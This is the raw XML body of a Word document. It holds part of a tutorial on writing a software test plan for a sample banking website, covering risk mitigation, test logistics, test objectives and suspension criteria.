                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>focused</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for web application testing?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Which Testing Types should be </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>ignored</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for saving cost?</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lastRenderedPageBreak/>
              <w:t>Step 2.3) Document Risk &amp; Issues</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9"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Risk is future’s </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>uncertain event</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> with a probability of </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>occurrence</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> and a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>potential</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> for loss. When the risk </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proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>actually</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> happens, it becomes the ‘</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>issue’.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the article </w:t>
            </w:r>
            <w:hyperlink r:id="rId58" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                </w:rPr>
                <w:t>Risk Analysis and Solution</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>, you have already learned about the ‘Risk’ analysis in detail and identified potential risks in the project.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the Test Plan, you will document those risks</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:horzAnchor="page" w:tblpX="906" w:tblpY="760"/>
              <w:tblW w:w="11189"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87"/>
              <w:gridCol w:w="7402"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="363"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3787"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Risk</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="7402"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Mitigation</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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Pr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve">Team member lack the required skills for </w:t>
                  </w:r>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve">      </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>website testing.</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Plan </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>training course</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> to skill up your members</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="558"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="378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project schedule is too tight; it's hard to complete this project on time</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="7402"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Set </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Test Priority</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> for each of the test activity.  </w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="363"/>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Manager has poor management skill</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Plan </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>leadership training</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> for manager</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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A lack of cooperation negatively affects your employees' productivity</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="7402"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Encourage </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>each team member in his task, </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>and inspire</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> them to greater efforts.  </w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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Wrong budget estimate and cost overruns</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Establish the </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>scope</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> before beginning work, pay a lot of attention to project planning and constantly track and measure the progress</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>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2.4) Create Test Logistics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 In Test Logistics, the Test Manager should answer the following questions:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Who </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>will test?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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When </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>will the test occur?</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Who will test?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may not know exact names of the tester who will test, but the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>type of tester</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> can be defined.</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select the right member for specified task, you have to consider if his skill is qualified for the task or not, also estimate the project budget. Selecting wrong member for the task may cause the project to</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> fail</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> or </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>delay</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w: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Person having the following skills is most ideal for performing software testing:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Ability to </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>understand</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> customers point of view</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Strong </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>desire</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for quality</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Attention</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> to detail</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Good </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>cooperation</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your project, the member who will take in charge for the test execution is the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>tester.</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> Base on the project budget, you can choose in-source or outsource member as the tester.</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When will the test occur?</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activities must be matched with associated development activities.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will start to test when you have </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>all required items</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> shown in following figure</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3) Define Test Objective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Objective is the overall goal and achievement of the test execution. The objective of the testing is finding as many software defects as possible; ensure that the software under test is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>bug free</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> before release.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define the test objectives, you should do 2 following steps</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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List all the software features (functionality, performance, GUI…) which may need to test.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Define the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>target</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> or the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>goal</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> of  the test based on  above features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Let’s apply these steps to find the test objective of your Guru99 Bank testing project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can choose the ‘</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>TOP-DOWN’ </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve">method to find the website’s features which may need to test. In </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>this method, you break down the application under test to </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>component</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sub-component</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>.</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the previous topic, you have already analyzed the requirement specs and walk through the website, so you can create a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Mind-Map</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> to find the website features as following</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pP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figure shows all the features which the Guru99 website may have.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Based on above features, you can define the Test Objective of the project Guru99 as following</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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that whether website Guru99 </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>functionality</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>(Account, Deposit…) is working as expected without any error or bugs in real business environment</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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that the external interface of the website such as </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>UI</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> is working as expected and &amp; meet the customer need</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Verify the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>usability</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> of the website. Are those functionalities convenient for user or not?</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4) Define Test Criteria</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Criteria is a standard or rule on which a test procedure or test judgment can be based. There’re 2 types of test criteria as following</w:t>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Suspension Criteria</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Specify the critical suspension criteria for a test. If the suspension criteria are met during testing, the active test cycle will be </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>suspended</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> until the criteria are </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>resolved</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>Example: If your team members report that there are </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>40%</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t> of test cases failed, you should </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>suspend</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t> testing until the development team fixes all the failed cases</w:t>
            </w:r>
          </w:p>
